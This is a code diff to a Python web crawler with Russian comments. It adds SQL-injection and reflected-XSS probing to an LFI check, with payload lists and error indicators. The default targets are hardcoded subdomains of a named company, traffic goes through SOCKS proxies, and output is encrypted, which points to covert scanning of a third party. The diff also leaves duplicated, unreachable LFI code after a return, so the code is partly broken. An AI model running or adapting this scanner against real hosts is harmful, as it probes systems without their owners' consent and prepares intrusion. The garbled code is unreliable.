@@ -17,6 +17,8 @@ import concurrent.futures as cf
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 FLAG_LFI = "--lfi" in sys.argv
+FLAG_SQLI = "--sqli" in sys.argv
+FLAG_XSS = "--xss" in sys.argv
 FLAG_KIRPICH = "--kirpich" in sys.argv
 
 LFI_NAMES = ("file", "path", "page", "template", "doc", "include", "lang", "dir", "folder", "style", "theme", "load", "read", "url", "filename", "filepath")
@@ -30,13 +32,64 @@ LFI_PAYLOADS = (
 )
 LFI_INDICATORS = ("root:", "daemon:", "win.ini", "[fonts]", "[extensions]", "boot.ini", "nobody:", "syntax error", "failed to open stream")
 
-HOSTS = sys.argv[1].split(",") if len(sys.argv) > 1 and not sys.argv[1].startswith("--") else [
-    "abetglobal.com", "www.abetglobal.com", "uat.abetglobal.com",
-    "testadmin.abetglobal.com", "eedmin.abetglobal.com", "manage.abetglobal.com",
-    "secure.abetglobal.com", "www.secure.abetglobal.com", "staging.abetglobal.com",
-    "forum.abetglobal.com", "api.abetglobal.com", "cmsapi.abetglobal.com",
-    "crypto.abetglobal.com", "testmt5.abetglobal.com", "applicationapi.abetglobal.com",
-]
+SQLI_NAMES = ("id", "user", "uid", "page", "cat", "category", "product", "item", "news", "article", "post", "search", "q", "query", "lang", "file", "doc", "download", "ref", "order", "sort")
+SQLI_PAYLOADS = (
+    "'",
+    "''",
+    "' OR '1'='1",
+    "' OR 1=1--",
+    "1' AND '1'='1",
+    "1' AND '1'='2",
+    "' UNION SELECT NULL--",
+    "' UNION SELECT NULL,NULL--",
+    "'; WAITFOR DELAY '0:0:5'--",
+    "1 AND SLEEP(5)",
+    "\" OR \"1\"=\"1",
+    "1 OR 1=1",
+)
+SQLI_INDICATORS = (
+    "sql syntax", "mysql", "mariadb", "postgresql", "oracle", "sqlite", "microsoft odbc",
+    "unclosed quotation", "unterminated string", "mysql_fetch", "you have an error",
+    "warning: mysql", "pg_query", "syntax error", "db error", "database error",
+    "sqlstate", "odbc driver", "server error in", "exception", "stack trace",
+    "query failed", "invalid query", "psql", "mssql", "sql server",
+)
+SQLI_TIME_MS = 4500  # порог для time-based детекции
+
+XSS_NAMES = ("q", "search", "query", "s", "term", "name", "user", "username", "email", "comment", "msg", "message", "text", "title", "lang", "page", "url", "link", "id", "ref")
+XSS_PAYLOADS = (
+    '<script>alert(1)</script>',
+    '"><script>alert(1)</script>',
+    "'><script>alert(1)</script>",
+    '<img src=x onerror=alert(1)>',
+    '"><img src=x onerror=alert(1)>',
+    '<svg/onload=alert(1)>',
+    '"><svg/onload=alert(1)>',
+    '<iframe src="javascript:alert(1)">',
+    '"><iframe src="javascript:alert(1)">',
+    'javascript:alert(1)',
+    '"><svg onload=alert(document.domain)>',
+)
+XSS_REFLECT = ("<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "<svg/onload=alert(1)>", "<iframe src=\"javascript:alert(1)\">", "<svg onload=alert(document.domain)>")
+
+def _parse_hosts():
+    """Хосты — из аргументов без '--' (флаги отфильтровываем)."""
+    hosts = [a for a in sys.argv[1:] if not a.startswith("--") and "," in a]
+    if hosts:
+        return hosts[0].split(",")
+    # один хост без запятой тоже допустим
+    single = [a for a in sys.argv[1:] if not a.startswith("--") and "." in a]
+    if single:
+        return [single[0]]
+    return [
+        "abetglobal.com", "www.abetglobal.com", "uat.abetglobal.com",
+        "testadmin.abetglobal.com", "eedmin.abetglobal.com", "manage.abetglobal.com",
+        "secure.abetglobal.com", "www.secure.abetglobal.com", "staging.abetglobal.com",
+        "forum.abetglobal.com", "api.abetglobal.com", "cmsapi.abetglobal.com",
+        "crypto.abetglobal.com", "testmt5.abetglobal.com", "applicationapi.abetglobal.com",
+    ]
+
+HOSTS = _parse_hosts()
 
 PROXIES = [
     {"http": "socks5h://127.0.0.1:1080", "https": "socks5h://127.0.0.1:1080"},
@@ -246,6 +299,88 @@ def lfi_check(host, url):
                         break
     return hits
 
+
+def sqli_check(host, url):
+    """Полуактивная SQLi-проверка: параметры-кандидаты + payload, ищем индикаторы ошибок БД и time-based.
+    Только GET-запросы через прокси, без эксплуатации/дампов."""
+    from urllib.parse import urlparse, parse_qsl, urlencode, urlunparse
+    hits = []
+    if "?" not in url:
+        return hits
+    parsed = urlparse(url)
+    params = parse_qsl(parsed.query, keep_blank_values=True)
+    if not params:
+        return hits
+    for name, val in params:
+        if name.lower() not in SQLI_NAMES:
+            continue
+        for payload in SQLI_PAYLOADS:
+            new_q = urlencode([(n, payload if n == name else v) for n, v in params])
+            target = urlunparse(parsed._replace(query=new_q))
+            t0 = time.time()
+            st, ct, body = fetch(target, host)
+            dt = (time.time() - t0) * 1000
+            # time-based (SLEEP/WAITFOR)
+            if dt > SQLI_TIME_MS and ("sleep" in payload.lower() or "waitfor" in payload.lower()):
+                hits.append((name, payload, st, f"TIME-BASED {int(dt)}ms"))
+                continue
+            if st == 200 and body:
+                low = body.lower()
+                for ind in SQLI_INDICATORS:
+                    if ind in low:
+                        hits.append((name, payload, st, ind))
+                        break
+    return hits
+
+
+def xss_check(host, url):
+    """Полуактивная XSS-проверка: параметры-кандидаты + payload, проверка ОТРАЖЕНИЯ в ответе.
+    Только GET-запросы через прокси, без эксплуатации."""
+    from urllib.parse import urlparse, parse_qsl, urlencode, urlunparse
+    hits = []
+    if "?" not in url:
+        return hits
+    parsed = urlparse(url)
+    params = parse_qsl(parsed.query, keep_blank_values=True)
+    if not params:
+        return hits
+    for name, val in params:
+        if name.lower() not in XSS_NAMES:
+            continue
+        for payload in XSS_PAYLOADS:
+            new_q = urlencode([(n, payload if n == name else v) for n, v in params])
+            target = urlunparse(parsed._replace(query=new_q))
+            st, ct, body = fetch(target, host)
+            if st == 200 and body:
+                for ind in XSS_REFLECT:
+                    if ind in body:
+                        # отражение без экранирования = рефлектед XSS
+                        hits.append((name, payload, st, f"REFLECTED: {ind[:40]}"))
+                        break
+    return hits
+    """Полуактивная LFI-проверка: для параметров-кандидатов подставляет traversal payload.
+    Возвращает список находок [(param, payload, code, indicator)]."""
+    from urllib.parse import urlparse, parse_qsl, urlencode, urlunparse
+    hits = []
+    if "?" not in url:
+        return hits
+    parsed = urlparse(url)
+    params = parse_qsl(parsed.query, keep_blank_values=True)
+    for name, val in params:
+        if name.lower() not in LFI_NAMES:
+            continue
+        for payload in LFI_PAYLOADS:
+            new_q = urlencode([(n, payload if n == name else v) for n, v in params])
+            target = urlunparse(parsed._replace(query=new_q))
+            st, ct, body = fetch(target, host)
+            if st == 200 and body:
+                low = body.lower()
+                for ind in LFI_INDICATORS:
+                    if ind in low:
+                        hits.append((name, payload, st, ind))
+                        break
+    return hits
+
 def main():
     target_name = HOSTS[0].replace(".com", "").replace(".pl", "").replace(".net", "").replace(".io", "").replace(".", "_")
     out_urls = f"/root/office/output/{target_name}_spider_urls.txt"
@@ -282,10 +417,23 @@ def main():
     # LFI-проход по всем собранным URL с параметрами
     lfi_hits = []
     cands = []
-    if FLAG_LFI:
-        print("\n=== LFI-ПРОВЕРКА (полуактивная, через прокси) ===", flush=True)
-        candidates = [u.split("\t", 1)[1] for u in all_urls if "?" in u]
-        cands = list(dict.fromkeys(candidates))[:80]
+    # ⚠️ Инъекции проводятся ТОЛЬКО по точкам входа: URL с параметрами (?) или формами.
+    # Если у хоста нет URL с параметрами — инъекции не запускаются (нет поверхности).
+    param_urls = [u.split("\t", 1)[1] for u in all_urls if "?" in u]
+    # Отсекаем cache-busting (?v=, ?ver=, ?_=, ?version=) — это НЕ точки входа
+    from urllib.parse import urlparse, parse_qsl
+    _real = []
+    for u in param_urls:
+        try:
+            q = dict(parse_qsl(urlparse(u).query))
+        except Exception:
+            q = {}
+        if q and not all(k.lower() in ("v", "ver", "version", "_", "t", "ts", "timestamp") for k in q):
+            _real.append(u)
+    param_urls = list(dict.fromkeys(_real))
+    if FLAG_LFI and param_urls:
+        print(f"\n=== LFI-ПРОВЕРКА (только URL с параметрами: {len(param_urls)}) ===", flush=True)
+        cands = param_urls[:80]
         with cf.ThreadPoolExecutor(max_workers=MAX_WORKERS) as ex:
             futs = {ex.submit(lfi_check, "spider", u): u for u in cands}
             for fu in cf.as_completed(futs):
@@ -296,13 +444,61 @@ def main():
                         print(f"[LFI-HIT] {u} | param={h[0]} payload={h[1]} code={h[2]} ind={h[3]}", flush=True)
                 except Exception:
                     pass
+    elif FLAG_LFI:
+        print("\n=== LFI: пропущено — URL с параметрами не найдены ===", flush=True)
     with open(lfi_out, "w") as f:
         f.write(f"# LFI-проверка паука, {time.strftime('%Y-%m-%d %H:%M')}, хостов={len(HOSTS)}, кандидатов={len(cands) if FLAG_LFI else 0}\n")
         for hit in lfi_hits:
             f.write(f"{hit[0]} | param={hit[1]} payload={hit[2]} code={hit[3]} ind={hit[4]}\n")
+    # SQLi-проход: только по URL с параметрами (точки входа)
+    sqli_hits = []
+    sqli_cands = []
+    if FLAG_SQLI and param_urls:
+        print(f"\n=== SQLi-ПРОВЕРКА (только URL с параметрами: {len(param_urls)}) ===", flush=True)
+        sqli_cands = param_urls[:80]
+        with cf.ThreadPoolExecutor(max_workers=MAX_WORKERS) as ex:
+            futs = {ex.submit(sqli_check, "spider", u): u for u in sqli_cands}
+            for fu in cf.as_completed(futs):
+                u = futs[fu]
+                try:
+                    for h in fu.result():
+                        sqli_hits.append((u, *h))
+                        print(f"[SQLI-HIT] {u} | param={h[0]} payload={h[1]} code={h[2]} ind={h[3]}", flush=True)
+                except Exception:
+                    pass
+    elif FLAG_SQLI:
+        print("\n=== SQLi: пропущено — URL с параметрами не найдены ===", flush=True)
+    sqli_out = f"/root/office/output/{target_name}_sqli.txt"
+    with open(sqli_out, "w") as f:
+        f.write(f"# SQLi-проверка паука, {time.strftime('%Y-%m-%d %H:%M')}, хостов={len(HOSTS)}, кандидатов={len(sqli_cands) if FLAG_SQLI else 0}\n")
+        for hit in sqli_hits:
+            f.write(f"{hit[0]} | param={hit[1]} payload={hit[2]} code={hit[3]} ind={hit[4]}\n")
+    # XSS-проход: только по URL с параметрами (точки входа)
+    xss_hits = []
+    xss_cands = []
+    if FLAG_XSS and param_urls:
+        print(f"\n=== XSS-ПРОВЕРКА (только URL с параметрами: {len(param_urls)}) ===", flush=True)
+        xss_cands = param_urls[:80]
+        with cf.ThreadPoolExecutor(max_workers=MAX_WORKERS) as ex:
+            futs = {ex.submit(xss_check, "spider", u): u for u in xss_cands}
+            for fu in cf.as_completed(futs):
+                u = futs[fu]
+                try:
+                    for h in fu.result():
+                        xss_hits.append((u, *h))
+                        print(f"[XSS-HIT] {u} | param={h[0]} payload={h[1]} code={h[2]} ind={h[3]}", flush=True)
+                except Exception:
+                    pass
+    elif FLAG_XSS:
+        print("\n=== XSS: пропущено — URL с параметрами не найдены ===", flush=True)
+    xss_out = f"/root/office/output/{target_name}_xss.txt"
+    with open(xss_out, "w") as f:
+        f.write(f"# XSS-проверка паука, {time.strftime('%Y-%m-%d %H:%M')}, хостов={len(HOSTS)}, кандидатов={len(xss_cands) if FLAG_XSS else 0}\n")
+        for hit in xss_hits:
+            f.write(f"{hit[0]} | param={hit[1]} payload={hit[2]} code={hit[3]} ind={hit[4]}\n")
     # Кирпич: шифрование результатов age-ключом проекта
     if FLAG_KIRPICH:
-        for f_ in (out_urls, out_js, out_forms, lfi_out):
+        for f_ in (out_urls, out_js, out_forms, lfi_out, sqli_out, xss_out):
             if os.path.exists(f_):
                 try:
                     subprocess.run(["kirpich-encrypt.sh", f_], check=True, capture_output=True)
@@ -310,7 +506,7 @@ def main():
                 except Exception as e:
                     print(f"[KIRPICH] не удалось ({f_}): {e}", flush=True)
     print("\n=== ИТОГО ===")
-    print(f"URL: {len(all_urls)} | JS: {len(all_js)} | FORM: {len(all_forms)} | LFI-HITS: {len(lfi_hits)}")
+    print(f"URL: {len(all_urls)} | JS: {len(all_js)} | FORM: {len(all_forms)} | LFI-HITS: {len(lfi_hits)} | SQLI-HITS: {len(sqli_hits)} | XSS-HITS: {len(xss_hits)}")
     print("\n--- ROBOTS ---")
     for h, r in robots_all.items():
         if r:
